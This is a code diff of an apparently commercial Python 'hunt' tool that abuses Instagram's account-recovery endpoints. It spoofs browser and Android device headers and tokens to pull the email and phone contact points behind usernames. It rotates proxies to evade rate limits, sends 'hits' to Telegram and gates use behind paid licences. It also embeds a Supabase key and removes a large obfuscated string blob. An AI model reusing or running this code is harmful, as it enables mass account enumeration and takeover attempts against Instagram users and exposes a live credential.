+        sess.cookies.set("datr", secrets.token_urlsafe(12), domain=".instagram.com")
+    return csrftoken, lsd
+
+
+def _graphql_recovery_lookup_once(query, proxies=None, *, timeout=20):
+    """Single GraphQL attempt — IG password reset page (masked email/phone)."""
+    sess = requests.Session()
+    csrftoken, lsd = _bootstrap_ig_recovery_web_session(sess, proxies)
+    if not csrftoken or not lsd:
+        return HitRecoveryResult(
+            query=query, found=False, error="Session bootstrap failed", error_kind="bootstrap"
+        )
+    variables = json.dumps({
+        "params": {
+            "event_request_id": str(uuid.uuid4()),
+            "next_uri": "",
+            "search_query": query,
+            "waterfall_id": str(uuid.uuid4()),
+        }
+    }, separators=(",", ":"))
+    payload = {
+        "av": "0",
+        "__d": "www",
+        "__user": "0",
+        "__a": "1",
+        "__req": "8",
+        "dpr": "1",
+        "__ccg": "GOOD",
+        "__comet_req": "7",
+        "__crn": "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
+        "qpl_active_flow_ids": "516759801",
+        "fb_api_caller_class": "RelayModern",
+        "fb_api_req_friendly_name": "CAAIGAccountSearchViewQuery",
+        "server_timestamps": "true",
+        "doc_id": _HIT_GRAPHQL_DOC_ID,
+        "variables": variables,
+        "jazoest": str(random.randint(20000, 29999)),
+        "lsd": lsd,
+    }
+    headers = {
+        "User-Agent": (
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+            "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+        ),
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "X-CSRFToken": csrftoken,
+        "X-IG-App-ID": "936619743392459",
+        "X-FB-Friendly-Name": "CAAIGAccountSearchViewQuery",
+        "X-ASBD-ID": "359341",
+        "X-FB-LSD": lsd,
+        "Origin": "https://www.instagram.com",
+        "Referer": _HIT_RECOVERY_RESET_URL,
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+    }
+    try:
+        resp = sess.post(
+            "https://www.instagram.com/api/graphql",
+            data=payload,
+            headers=headers,
+            timeout=timeout,
+            proxies=proxies,
+        )
+        if resp.status_code in (429, 502, 503, 504):
+            return HitRecoveryResult(
+                query=query, found=False, error="Instagram busy", error_kind="upstream"
+        )
+        if resp.status_code != 200:
+            return HitRecoveryResult(
+                query=query, found=False, error=f"HTTP {resp.status_code}", error_kind="http_error"
+            )
+        body = resp.text or ""
+        if body.startswith("for (;;);"):
+            body = body[9:]
+        if _HIT_LOOKUP_NO_ACCOUNT_RE.search(body):
+            return HitRecoveryResult(
+                query=query, found=False, error="No account found", error_kind="not_found"
+            )
+        if "Something went wrong" in body or "Please try again later" in body:
+            return HitRecoveryResult(
+                query=query, found=False, error="Instagram busy", error_kind="rate_limited"
+            )
+        if '"error":' in body and '"contact_points"' not in body:
+            return HitRecoveryResult(
+                query=query, found=False, error="Instagram busy", error_kind="rate_limited"
+            )
+        points = []
+        try:
+            data = json.loads(body)
+            search = (data.get("data") or {}).get("caa_ar_ig_account_search") or {}
+            points = search.get("contact_points") or []
+        except (ValueError, TypeError, AttributeError):
+            points = []
+        if not points:
+            points = _extract_json_contact_points(body)
+        parsed = _hit_result_from_contact_points(query, points)
+        if parsed:
+            return parsed
+        return HitRecoveryResult(
+            query=query, found=False, error="No contact info", error_kind="no_contact"
+        )
+    except Exception:
+        return HitRecoveryResult(
+            query=query, found=False, error="Connection error", error_kind="network"
+        )
+
+
+def _graphql_recovery_lookup(
+    query,
+    *,
+    proxy_tries=None,
+    http_timeout=20,
+    direct_first=True,
+    max_wall_sec=None,
+):
+    """Web GraphQL — own IP first, proxies only on retryable failure."""
+    query = (query or "").strip().lstrip("@")
+    if not query:
+        return HitRecoveryResult(query=query, found=False, error="Empty query")
+    deadline = (time.monotonic() + float(max_wall_sec)) if max_wall_sec else None
+    last = None
+    for attempt, proxies in enumerate(
+        _hit_proxy_attempts(proxy_tries=proxy_tries, direct_first=direct_first)
+    ):
+        if deadline and time.monotonic() >= deadline:
+            break
+        _hit_proxy_retry_pause(attempt)
+        req_timeout = http_timeout
+        if deadline:
+            req_timeout = min(http_timeout, max(3, int(deadline - time.monotonic())))
+        result = _graphql_recovery_lookup_once(query, proxies, timeout=req_timeout)
+        last = result
+        if result.found:
+            return result
+        if result.error_kind == "not_found":
+            return result
+        if not _recovery_error_retryable(result):
+            return result
+        if proxies and (
+            _recovery_proxy_bad(result)
+            or getattr(result, "error_kind", None) in ("network", "bootstrap", "http_error", "upstream")
+        ):
+            hit_proxy_mark_bad(proxies)
+    return last or HitRecoveryResult(
+        query=query, found=False, error="Instagram busy", error_kind="rate_limited"
+    )
+
+
+def _graphql_recovery_lookup_fast(query, *, max_wall_sec=None):
+    """Own IP once → up to 10 proxy retries; bad proxies removed from pool."""
+    return _graphql_recovery_lookup(
+        query,
+        proxy_tries=_HIT_RECOVERY_PROXY_TRIES,
+        http_timeout=_HIT_GRAPHQL_FAST_HTTP_TIMEOUT,
+        direct_first=True,
+        max_wall_sec=max_wall_sec,
+        )
+
+
+def _hit_lookup_parse_bloks(query, body):
+    if _HIT_LOOKUP_NO_ACCOUNT_RE.search(body):
+        return HitRecoveryResult(
+            query=query, found=False, error="No account found", error_kind="not_found"
+        )
+    if "challenge_required" in body or "checkpoint_required" in body:
+        return HitRecoveryResult(
+            query=query, found=False, error="Challenge required", error_kind="server"
+        )
+    if "Something went wrong" in body or "Please try again later" in body:
+        return HitRecoveryResult(
+            query=query, found=False, error="Instagram busy", error_kind="rate_limited"
+        )
+    sent = _HIT_SENT_CODE_RE.search(body or "")
+    contact_points = _filter_valid_contact_points(_extract_json_contact_points(body))
+    if sent:
+        email = sent.group(1).strip().lower()
+        if _is_valid_ig_recovery_email(email):
+            contact_points.insert(0, {"type": "EMAIL", "contact_point": email})
+    if not contact_points:
+        emails = [
+            e.lower()
+            for e in dict.fromkeys(_HIT_LOOKUP_EMAIL_RE.findall(body or ""))
+            if _is_valid_ig_recovery_email(e)
+        ]
+        emails.extend(
+            e.lower()
+            for e in dict.fromkeys(_HIT_BODY_EMAIL_RE.findall(body or ""))
+            if _is_valid_ig_recovery_email(e)
+        )
+        phones = [
+            p
+            for p in dict.fromkeys(_HIT_LOOKUP_PHONE_RE.findall(body or ""))
+            if _is_valid_ig_recovery_phone(p)
+        ]
+    for value in phones:
+        contact_points.append({"type": "PHONE", "contact_point": value})
+    for value in dict.fromkeys(emails):
+        contact_points.append({"type": "EMAIL", "contact_point": value})
+    if not contact_points:
+        if len(body) < 8000:
+            return HitRecoveryResult(
+                query=query, found=False, error="No account found", error_kind="not_found"
+            )
+        return HitRecoveryResult(
+            query=query, found=False, error="Instagram busy", error_kind="rate_limited"
+        )
+    parsed = _hit_result_from_contact_points(query, contact_points)
+    if parsed:
+        return parsed
+    return HitRecoveryResult(
+        query=query, found=False, error="No contact info", error_kind="not_found"
+    )
+
+
+class InstagramRecoveryLookup:
+    """Mobile IG account-recovery search — inlined for hit MORE section."""
+
+    def __init__(self, session=None):
+        self.session = session or requests.Session()
+        self._init_mobile_http()
+
+    def _init_mobile_http(self):
+        self._mobile_http, self._mobile_http_backend = _new_hit_http_session()
+
+    def _mobile_post(self, url, data, headers):
+        hdrs = {"User-Agent": _HIT_LOOKUP_MOBILE_UA, **headers}
+        last_exc = None
+        for attempt, proxies in enumerate(_hit_proxy_attempts()):
+            _hit_proxy_retry_pause(attempt)
+            try:
+                resp = _hit_http_post(
+                    self._mobile_http, self._mobile_http_backend, url,
+                    data=data, headers=hdrs, timeout=30, proxies=proxies,
+                )
+                status = getattr(resp, "status_code", 0) if resp is not None else 0
+                if _hit_http_status_proxy_retry(status):
+                    if proxies:
+                        hit_proxy_mark_bad(proxies)
+                    continue
+                return resp
+            except Exception as exc:
+                last_exc = exc
+                if proxies:
+                    hit_proxy_mark_bad(proxies)
+                continue
+        if last_exc:
+            raise last_exc
+        return None
+
+    def _mobile_get(self, url, *, params=None, headers=None, timeout=20):
+        hdrs = {"User-Agent": _HIT_LOOKUP_MOBILE_UA, **(headers or {})}
+        last_exc = None
+        for attempt, proxies in enumerate(_hit_proxy_attempts()):
+            _hit_proxy_retry_pause(attempt)
+            try:
+                resp = _hit_http_get(
+                    self._mobile_http, self._mobile_http_backend, url,
+                    params=params, headers=hdrs, timeout=timeout, proxies=proxies,
+                )
+                status = getattr(resp, "status_code", 0) if resp is not None else 0
+                if _hit_http_status_proxy_retry(status):
+                    if proxies:
+                        hit_proxy_mark_bad(proxies)
+                    continue
+                return resp
+            except Exception as exc:
+                last_exc = exc
+                if proxies:
+                    hit_proxy_mark_bad(proxies)
+                continue
+        if last_exc:
+            raise last_exc
+        return None
+
+    def _fetch_user_id(self, username):
+        for app_id in (_HIT_LOOKUP_MOBILE_APP_ID, "936619743392459"):
+            try:
+                resp = self._mobile_get(
+                    _HIT_LOOKUP_PROFILE_URL,
+                    params={"username": username},
+                    headers={"X-IG-App-ID": app_id},
+                )
+                if resp.status_code != 200:
+                    continue
+                user = (resp.json().get("data") or {}).get("user") or {}
+                user_id = str(user.get("id") or user.get("pk") or "") or None
+                if user_id:
+                    return user_id
+            except (requests.RequestException, ValueError, TypeError, AttributeError):
+                continue
+        return None
+
+    def _enrich(self, result):
+        username = result.username or result.query
+        if not username:
+            return result
+        time.sleep(random.uniform(0.3, 0.8))
+        user_id = self._fetch_user_id(username)
+        if user_id:
+            result.account_created = _estimate_join_year_from_user_id(user_id)
+        return result
+
+    def _lookup_mobile_once(self, query):
+        device_id = str(uuid.uuid4())
+        family_id = str(uuid.uuid4())
+        android_id = "android-" + secrets.token_hex(8)
+        tz = datetime.now(timezone.utc).astimezone().utcoffset()
+        tz_sec = int(tz.total_seconds()) if tz else 0
+        client_params = {
+            "aac": json.dumps(
+                {
+                    "aac_init_timestamp": int(time.time()),
+                    "aacjid": str(uuid.uuid4()),
+                    "aaccs": secrets.token_urlsafe(32),
+                },
+                separators=(",", ":"),
+            ),
+            "flash_call_permissions_status": {
+                "READ_PHONE_STATE": "PERMANENTLY_DENIED",
+                "READ_CALL_LOG": "DENIED",
+                "ANSWER_PHONE_CALLS": "DENIED",
+            },
+            "was_headers_prefill_available": 0,
+            "search_query": query,
+            "search_screen_type": "email_or_username",
+            "android_build_type": "release",
+            "is_whatsapp_installed": 1,
+            "ig_android_qe_device_id": device_id,
+        }
+        server_params = {
+            "event_request_id": str(uuid.uuid4()),
+            "device_id": android_id,
+            "waterfall_id": str(uuid.uuid4()),
+            "family_device_id": family_id,
+            "qe_device_id": device_id,
+            "is_from_logged_out": 0,
+            "login_entry_point": "logged_out",
+        }
+        payload = {
+            "params": json.dumps(
+                {"client_input_params": client_params, "server_params": server_params},
+                separators=(",", ":"),
+            ),
+            "bk_client_context": json.dumps(
+                {"bloks_version": _HIT_LOOKUP_BLOKS_VERSION, "styles_id": "instagram"},
+                separators=(",", ":"),
+            ),
+            "bloks_versioning_id": _HIT_LOOKUP_BLOKS_VERSION,
+        }
+        headers = {
+            "User-Agent": _HIT_LOOKUP_MOBILE_UA,
+            "Accept-Language": "en-IN, en-US",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Bloks-Version-Id": _HIT_LOOKUP_BLOKS_VERSION,
+            "X-FB-Friendly-Name": (
+                "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/"
+            ),
+            "X-IG-Android-Id": android_id,
+            "X-IG-App-Id": _HIT_LOOKUP_MOBILE_APP_ID,
+            "X-IG-App-Locale": "en_IN",
+            "X-IG-Client-Endpoint": "com.bloks.www.caa.ar.search",
+            "X-IG-Device-Id": device_id,
+            "X-IG-Family-Device-Id": family_id,
+            "X-IG-Timezone-Offset": str(tz_sec),
+            "X-MID": base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip("="),
+            "X-Pigeon-Rawclienttime": str(time.time()),
+            "X-Pigeon-Session-Id": f"UFS-{uuid.uuid4()}-0",
+        }
+        try:
+            resp = self._mobile_post(_HIT_LOOKUP_BLOKS_URL, payload, headers)
+            if resp is None or getattr(resp, "status_code", 0) != 200:
+                return HitRecoveryResult(
+                    query=query, found=False, error="Instagram busy", error_kind="rate_limited"
+                )
+            return _hit_lookup_parse_bloks(query, resp.text)
+        except Exception:
+            return HitRecoveryResult(
+                query=query, found=False, error="Connection error", error_kind="network"
+            )
+
+    def lookup(self, query, *, refresh_tokens=True, max_retries=None):
+        query = query.strip().lstrip("@")
+        if not query:
+            return HitRecoveryResult(query=query, found=False, error="Empty query")
+        last = None
+        retries = max(1, int(max_retries if max_retries is not None else _HIT_LOOKUP_RETRIES))
+        for attempt in range(retries):
+            if attempt > 0:
+                self._init_mobile_http()
+                time.sleep(_HIT_LOOKUP_RETRY_DELAY * attempt + random.uniform(0.5, 1.5))
+            last = self._lookup_mobile_once(query)
+            if last.found:
+                return self._enrich(last)
+            if last.error_kind not in ("rate_limited", "server", "network", "bootstrap", "upstream"):
+                return last
+        return last or HitRecoveryResult(
+            query=query, found=False, error="Instagram busy", error_kind="rate_limited"
+        )
+
+GEN_CMD_MAX_COUNT = 5
+GEN_CMD_MAX_MIN = 5000
+
+# ═══ SUPABASE — fill these before encrypting / shipping the build ═══
+SUPABASE_URL = "https://pqlchnzcgramceqrsfrn.supabase.co"
+SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBxbGNobnpjZ3JhbWNlcXJzZnJuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNTQ4NTcsImV4cCI6MjA5NDgzMDg1N30.enm6Sz8d5o5Fvgn3FsKMf2dLFtOggGL-mhVBDx853BM"
+
+ip = "127.0.0.1"
+port = "5001"
+
+
+def _is_termux():
+    return bool(os.environ.get("TERMUX_VERSION")) or (
+        (os.environ.get("PREFIX") or "").startswith("/data/data/com.termux")
+    )
+
+
+def _env_thread_slots(default):
+    raw = os.environ.get("JACK_THREADS", "").strip()
+    if not raw:
+        return default
+    try:
+        return max(1, int(raw))
+    except ValueError:
+        return default
+
+
+# Hunt throughput — desktop vs Termux (phone: lighter workers, longer read timeouts for VPN).
+_IS_TERMUX = _is_termux()
+if _IS_TERMUX:
+    HUNT_PROFILE = "termux"
+    TIMEOUT = 52
+    # Termux: 56 default — endpoint must allow matching slots (restart endpoint after /set threads).
+    TERMUX_HUNT_GATEWAY_MAX = 64
+    THREAD_COUNT = _env_thread_slots(56)
+    HUNT_CONNECT_TIMEOUT = 4
+    HUNT_IG_GEN_READ_TIMEOUT = 22
+    HUNT_LOOKUP_READ_TIMEOUT = 18
+    HUNT_CYCLE_TIMEOUT = 58
+    HUNT_GATEWAY_CONCURRENCY = min(THREAD_COUNT, TERMUX_HUNT_GATEWAY_MAX)
+    HUNT_BLIP_WINDOW_SEC = 3.0
+    HUNT_BLIP_TRIGGER = 8
+    HUNT_BLIP_PAUSE_SEC = 1.0
+    HUNT_IG_RATE_LIMIT_STREAK_TRIGGER = 80
+    HUNT_IG_RATE_LIMIT_PAUSE_SEC = 120.0
+    API_WORKER_IDLE_SEC = 20
+    API_WORKER_RECOVERY_IDLE = 1.0
+else:
+    HUNT_PROFILE = "desktop"
+    TIMEOUT = 38
+    # Desktop: 64 workers — closer to competitor tools (xd uses 100 direct threads).
+    DESKTOP_HUNT_GATEWAY_MAX = 40
+    THREAD_COUNT = _env_thread_slots(DESKTOP_HUNT_GATEWAY_MAX)
+    HUNT_CONNECT_TIMEOUT = 3
+    HUNT_IG_GEN_READ_TIMEOUT = 12
+    HUNT_LOOKUP_READ_TIMEOUT = 14
+    HUNT_CYCLE_TIMEOUT = 48
+    HUNT_GATEWAY_CONCURRENCY = min(THREAD_COUNT, DESKTOP_HUNT_GATEWAY_MAX)
+    HUNT_BLIP_WINDOW_SEC = 2.0
+    HUNT_BLIP_TRIGGER = 6
+    HUNT_BLIP_PAUSE_SEC = 0.8
+    HUNT_IG_RATE_LIMIT_STREAK_TRIGGER = 80
+    HUNT_IG_RATE_LIMIT_PAUSE_SEC = 120.0
+    API_WORKER_IDLE_SEC = 15
+    API_WORKER_RECOVERY_IDLE = 3.0
+
+# Mobile hit enrich + panel — desktop keeps env-tunable defaults from above.
+if _IS_TERMUX:
+    _HIT_LOOKUP_RETRIES = 10
+    _HIT_RECOVERY_PROXY_TRIES = 10
+    _HIT_POSTS_FETCH_RETRIES = 10
+    _HIT_PFP_DOWNLOAD_RETRIES = 2
+    _HIT_PFP_REFRESH_ROUNDS = 1
+    _HIT_POSTS_FETCH_ROUNDS = 2
+    _HIT_CONTACT_SYNC_TIMEOUT = 28
+    _HIT_PROFILE_SYNC_TIMEOUT = 32
+    _HIT_GRAPHQL_FAST_PROXY_TRIES = 2
+    _HIT_GRAPHQL_FAST_HTTP_TIMEOUT = 14
+    _HIT_MOBILE_BG_RETRIES = 3
+else:
+    _HIT_LOOKUP_RETRIES = 4
+    _HIT_RECOVERY_PROXY_TRIES = 10
+    _HIT_POSTS_FETCH_RETRIES = 10
+    _HIT_PFP_DOWNLOAD_RETRIES = 2
+    _HIT_PFP_REFRESH_ROUNDS = 1
+    _HIT_POSTS_FETCH_ROUNDS = 2
+    _HIT_CONTACT_SYNC_TIMEOUT = 180
+    _HIT_PROFILE_SYNC_TIMEOUT = 16
+    _HIT_GRAPHQL_FAST_PROXY_TRIES = 3
+    _HIT_GRAPHQL_FAST_HTTP_TIMEOUT = 8
+    _HIT_MOBILE_BG_RETRIES = 2
+
+# Hunt IG lookup — M1 bloks primary in hunt_cycle; /ig_lookup_m1 for legacy 3-hop.
+HUNT_IG_LOOKUP_ROUTE = "/ig_lookup_m1"
+HUNT_IG_RECOVERY_ROUTE = "/ig_recovery"
+_HIT_RECOVERY_API_READ_TIMEOUT = 180
+_HIT_CONTACT_HUNT_READ_TIMEOUT = 18 if _IS_TERMUX else 32
+_HIT_CONTACT_HUNT_ATTEMPTS = 2
+HUNT_BUFFER_BACKLOG_MIN = 960 if _IS_TERMUX else 1200
+TERMUX_BUFFER_NEAR_FULL = 220
+# Single /hunt_cycle hop — ig_gen + M3 lookup + gmail on endpoint (no 3× localhost round-trips).
+HUNT_USE_CYCLE = True
+MIN_FOLLOWERS = 10
+# IG graphql gen no longer returns follower_count — keep /set min UI, filter disabled server-side.
+MIN_FOLLOWERS_FILTER_ENABLED = False
+RETRY_TOTAL = 0
+
+STARTUP_PHOTO_URL = "https://pixedge.vercel.app/i/n6ky9h4l"
+
+TELEGRAM_BOT_TOKEN = ""
+TELEGRAM_CHAT_ID = ""
+DEVICE_HASH = ""
+OPERATOR_ID = ""
+TELEGRAM_ENABLED = False
+TELEGRAM_API_URL = ""
+CLOUD_TIMEOUT = 12
+CLOUD_CONNECT_TIMEOUT = 5
+VERIFY_UI_TIMEOUT = 20
+API_PROBE_TIMEOUT = 4.0 if _IS_TERMUX else 5.0
+API_PROBE_FAIL_THRESHOLD = 5 if _IS_TERMUX else 10
+_api_probe_fail_streak = 0
+CLOUD_PROBE_TIMEOUT = 4
+PROBE_INTERVAL_OK = 10
+PROBE_INTERVAL_FAIL = 2 if _IS_TERMUX else 4
+API_HUNT_ALIVE_GRACE_SEC = 30 if _IS_TERMUX else 45
+HUNT_KEEPALIVE_BUFFER_MIN = 80 if _IS_TERMUX else 200
+HUNT_KEEPALIVE_IDLE_SEC = 120 if _IS_TERMUX else 180
+
+PAUSED_SINCE = None
+_admin_settings = {
+    "admin_ids": [],
+    "admin_bot_token": "",
+    "logs_group_id": "",
+    "hits_group_id": "",
+    "channel_username": "inpareto",
+    "operator_bot_name": "INPARETO Jack",
+    "operator_bot_description": "Hit alerts & remote hunt control.\nDeveloped by S Crew",
+    "operator_bot_short_description": "INPARETO · S Crew",
+    "operator_bot_photo_url": "",
+}
+_ADMIN_SETTINGS_KNOWN_KEYS = frozenset(_admin_settings.keys()) | frozenset({
+    "operator_hit_group_title",
+    "operator_hit_group_description",
+    "operator_hit_group_photo_url",
+})
+_admin_access_cache = {"user_id": None, "ok": False, "at": 0.0}
+_ban_cache = {"user_id": None, "banned": False, "at": 0.0}
+_admin_settings_loaded_at = 0.0
+_operator_gate_cache = {"user_id": None, "ok": None, "at": 0.0}
+_operator_access_sticky_until = 0.0
+_gate_terminal_print_at = 0.0
+_hit_group_admin_cache = {"gid": "", "ok": None, "at": 0.0}
+_hit_group_last_delivery_at = 0.0
+_tg_fast_executor = ThreadPoolExecutor(max_workers=12, thread_name_prefix="tgfast")
+_tg_cmd_executor = ThreadPoolExecutor(max_workers=8, thread_name_prefix="tgcmd")
+TG_INSTANT_TIMEOUT = 4
+TG_INSTANT_MAX_RETRIES = 1
+_operator_cmd_ctx = threading.local()
+ADMIN_ACCESS_TTL = 90
+BAN_CHECK_TTL = 25
+ADMIN_SETTINGS_TTL = 60
+ADMIN_MEMBER_TIMEOUT = 3
+HIT_GROUP_MEMBER_TIMEOUT = 5
+STARTUP_PHOTO_TIMEOUT = 12
+STARTUP_PHOTO_RETRIES = 4
+STARTUP_PHOTO_RETRY_DELAY = 1.25
+STARTUP_PHOTO_TOTAL_WAIT_SEC = 14.0
+STARTUP_PHOTO_SEND_RETRIES = 4
+STARTUP_PHOTO_CACHE_TTL = 600
+BOT_BRANDING_RETRIES = 4
+BOT_BRANDING_RETRY_DELAY = 2.0
+BOT_PHOTO_DOWNLOAD_TIMEOUT = 25
+OPERATOR_GATE_TTL = 180
+OPERATOR_ACCESS_STICKY_SEC = 900
+ACCESS_TRUST_GRACE_SEC = 3600
+_access_trust_ok_at = 0.0
+SESSION_VERIFIED_MAX_AGE_SEC = 7 * 24 * 3600
+TG_BOT_CMD_MAX_RETRIES = 6
+_legacy_state_migrated = False
+_picked_state_dir = None
+_STATE_KEY_V2 = b"v2"
+HIT_GROUP_ADMIN_TTL = 300
+GATE_TERMINAL_PRINT_COOLDOWN = 300.0
+TERMINAL_NOTICE_REPEAT_SEC = 600.0
+ACCESS_SYNC_INTERVAL_SEC = 20
+_session_awaiting_verification = False
+_boot_configuring = False
+_telegram_monitor_started = False
+_terminal_notice_signature = ""
+_terminal_notice_last_print_at = 0.0
+LICENSE_REGISTRY_KEY = "paid_access"
+USER_HIT_GROUP_REGISTRY_KEY = "operator_hit_groups"
+OPERATOR_LINKS_REGISTRY_KEY = "operator_links"
+LICENSE_CACHE_TTL = 45
+LICENSE_MAX_DAYS = 3650
+LICENSE_KEY_PREFIX = "INPA"
+FREE_TRIAL_DAYS = 7
+FREE_DAILY_GEN_LIMIT = 10_000
+PLAN_FREE = "free"
+PLAN_PREMIUM = "premium"
+FREE_PLAN_WARN_PCT = (0.80, 0.95)
+PLAN_CLOUD_OFFLINE_GRACE_SEC = 7200
+PLAN_REGISTRY_RELOAD_SEC = 30
+PLAN_CLOUD_BATCH_EVERY = 8 if _IS_TERMUX else 12
+_plan_acquire_cache = {
+    "user_id": "",
+    "row": None,
+    "reg": None,
+    "loaded_at": 0.0,
+    "cloud_pending": 0,
+}
+_plan_limit_notify_signature = ""
+_plan_limit_warn_level = 0
+_plan_limit_warn_day = ""
+_paid_access_cache = {"registry": None, "at": 0.0}
+_paid_access_lock = threading.Lock()
+_license_registry_lock = threading.RLock()
+_admin_settings_io_lock = threading.RLock()
+TG_CMD_MAX_RETRIES = 2
+ADMIN_MEMBER_OK = frozenset({"creator", "administrator", "member", "restricted"})
+ACCESS_BLOCKED = False
+_access_sync_stop = threading.Event()
+_hit_group_gate_state = {
+    "message_ids": [],
+    "last_send_at": 0.0,
+    "last_edit_id": None,
+}
+_hit_group_gate_lock = threading.Lock()
+HIT_GROUP_GATE_SEND_COOLDOWN = 15.0
+_fav_note_pending = {"username": None}
+_fav_note_pending_lock = threading.Lock()
+FAV_NOTE_MAX_LEN = 500
+_cloud_favorite_notes_column = None
+_cloud_quality_columns = None
+
+_QUALITY_CLOUD_KEYS = (
+    "best_hit_quality",
+    "quality_hits_3plus",
+    "quality_hits_4plus",
+    "quality_hits_5",
 )
-_74434bc333 = (
-        'd*CI6tQ5|M{#lsHc$%a&v4xeB*4niNG)%`RvxlD0=9O+ntPnP3)FqhRtHNiHKh;iFLBj|~',
-        'bJCu-OmSo_V)$cjf)X@5;>6O2<mYw;YlRmRS6FdIkBH1SGB9FIAtwr4hU%{)Z12_X2Ckgp',
-        'd_A>MLj*@CS<}%uLsSA|Z1ya)znA4J1LoxoRh2Q_*i0bo(LL_Z&TqcqHBQj*_CSB3E<ed-',
-        'I<T0(>0Je|(V_%5U~3;{@%=eZz~bF8O}y@X&sRk&n4-h=v`sm(-F-o6iI>V`?4M6Wxa&!<',
-        'ryx2*ck&><x}NT`{g=0#t>333K}q-D-#ie=Tm*-=_&11(nwoGt$JVOm)e17%WD;`}-CoJE',
-        'Ln?Eb_5c#zBIroK&Q@reL#GvlCFj;R6lRj~uyCE=O#WpgRT8Nh!>Su?Qff`dgoh6!Ejm-k',
-        'V#KO0guFTk62l&^bN}vs{3t%&M8D|2GfDw}s3gb)*@~aWeS@s3@o=={45Z}wYMHCmY{z9w',
-        'kF|+;|L4qvK3avBGrl}u(HgT6S<7`FY4{tj0Fq8tLl0et?4(Fr9()kEMNhOno<vC$sdlgS',
-        'T8pVXxwpBo&jhbmutp3r$NYod0S%#o!>|4{X201PzO~`2a4*FIvKoLoK5KV(gXNPeM(6iY',
-        'hkqDvnQ2FdC&OWYp=5H}ur$;~oS$3V7ZgY^L~-hUx>bd`m9yYRUSk<~zD0`)%lxSAt_-~_',
-        'G^(444=t~t&M3a8wZ_4Z==!yK`2hNNF_feJ9-{FGea`5C7^#d5AsG%NDP}mEAO!VkMC4um',
-        'C_!?dDwA>v5i*Q?ro``6hN|IB9*lAh*TrceX{T-vKGmIqen|T9=_?Sm2W&FLG~!*zgAdZB',
-        '|6wr&fuy!ET0!F$42Kf1Cwxx)*j}hgW%^iY!<D+Pz~x5%x?JYg3wobT>N!FC(<dE$-?p73',
-        'jcldEBD9Bv%vIJy8P}^QH8`RZ+XgTI`Pnv@cgAGC_pgZ0@vmdA`%AA!#-xz$88$Fro*0m;',
-        's(1gU{Ia#p{#RuoxmP0Fq`!ZTZAzZ&3YRq%3k!7?wM_<6HXmkd)LclC?18K)-wFeA_X{{H',
-        't7QNletpwLV*TGlL(ipCqqM2V|GnR>mcp;LGS3wu?v7{zU7jfOgEv9dZFAM!fh7WOoUfR&',
-        'Wll?+Y~mv{yyHc_{YziME1BSawzETFo1M_h9rD1h8l;^w+|8_ngwmm+HuZ3j=EtwOyMf|T',
-        '#!;u1pl5-8s1*J!QR2doJ(L_Zp}|4T;rjy^HMBhTTbX%W%tc?!q-1_M0viNFfF@_EUJ~5v',
-        'big3Js}nY$oPs`Mhwx<D(6i}O$@1-Cml5Qhfuxv*2^H`6%JUcYF;ab+WZ5B845{r48Y&Ym',
-        'y9ndZ>f!e%70J>{uGh{%V;DrFAG>-pQIRRgy9_IdJ_b**seCbj2sS?=@abY@hpwjgag_y!',
-        'Q|xEx36E7ur(uMtqxM?bZB3i7GqS`Daf>f#S=vU41Y?)UO_QJND-mt!&x{3Mey<O_T4w;G',
-        '-09RWKYrp&S}&3;jM=Q5g-sp=nZnr(#78$i|2~!htm@9j!jjE}pqv*6!|qvEvwGb`Aub?w',
-        '18nFmwP&VEo2|KnQ<g7t=QbOOPKbdc*#L8o|BMsk4~?cx=Y*fDr!0}25yICNBmc(LpNMfl',
-        '{4Ku=1YPz)2(=K>#KKtc+C|c~)RH#8knh(InSA4H$uT9F-<>t#3xiNj&A1Z7tz{kEbOQPs',
-        'ACLvc6XNBXfTN3~Q1eZjoH{y%8BMG6)CO-_-Xd;*IUPiyiBatKmW%VfLN=S=GiE;WG5>fi',
-        '_c~M6$CwBJX@*<`ZnmHSJ^j3OFX#@0VQpU|4&h3aE1|e_H$s5<lX>JuYd_-qx%GD*AtH|F',
-        'yw^@l2x9%dcI}HniXiw`dwt9ZO!>S$4X9qEw_PH@aF)w<0V;Qxx?UoC)N8+s`F*?^lsia3',
-        '+ZjCG0JN&~#s##Mn4u2rB3qiHgPBN23krGzIL5P+8Hc&g2NFnTTE7pQC?yYE?z)x&n*ge5',
-        'pa@?G7$8Il`~6;qEa~&5$Ja3+PzjZ$t5<}7Je9=6ey@qPGJR3C?9$P>XeOxVu+&Kcf=#Hi',
-        'Vb2%uynP+QV$8CDmbyN@kQVUm%voj*_Z11!*h}U8xY4(1&51@0s;D1p)<4XxZUTX{9xjQy',
-        '8kq2z{&QdEJw!HZ?h4R^Z#a|U=HUA5hi0<k^~VBnmYJ=Cr08?%N#s@CXYP^NBf+ZhezQ&6',
-        'z25k};a-}UZ!FM^obu*EQr(a}E)CikOgJsuP6pyizB5G?G9m(_th%04wqkrl?{;GVA;S5e',
-        'MPgo(h!?rG(KB1toPh=Yt4zjYQlw`tRuS4PxZexCtKWcf!UQ-e+d}i*V!!PxO^^`D%`xLw',
-        'S?Csye!9vb#cICJ1fOgzlKqt$xd2b&a40?WQe|4-eAQB$8kFWPmu~;>M^3N-FC-JcR?jJm',
-        'PcsKx1T{4Oq7GmffiI55d~mNc^g<%DUu{<Qb8y*fwF>1B2YIzb<)M{cnF&5OdO6Dc8Dnq4',
-        '9WIcWXm;$<u797R@fvH?SxPBE1HzKhaM8(zFH_R3Kh_9lPtDa#TBvD~O#TI~gd-tYkuE0!',
-        'x+kH&4R$d<qYw&fD|&(S$J`w8n;Lsg)Sr)a&tBj&I@`Jo0iF!<xgs3L%iE2N4*o<cH`t|P',
-        '5VW0^2e+CkYz<j%G?BM^aFUlOIc56I?KdnpYA1uD+YSs?7B89cO<@!1hWK69v^DO+F=0q_',
